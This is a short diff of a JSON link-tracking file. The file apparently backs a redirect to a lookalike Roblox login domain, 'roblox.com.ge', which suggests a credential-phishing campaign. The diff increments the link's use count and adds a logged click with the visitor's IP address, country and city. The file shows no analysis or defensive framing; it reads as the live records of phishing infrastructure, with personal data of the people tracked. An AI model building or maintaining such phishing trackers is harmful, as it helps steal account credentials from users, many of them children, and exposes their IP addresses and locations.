@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1513,
+    "useCount": 1514,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12270,6 +12270,14 @@
         "ip": "112.198.234.104",
         "country": "Philippines",
         "city": "Iloilo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777445733296,
+        "ip": "136.158.83.107",
+        "country": "Philippines",
+        "city": "Tanza",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
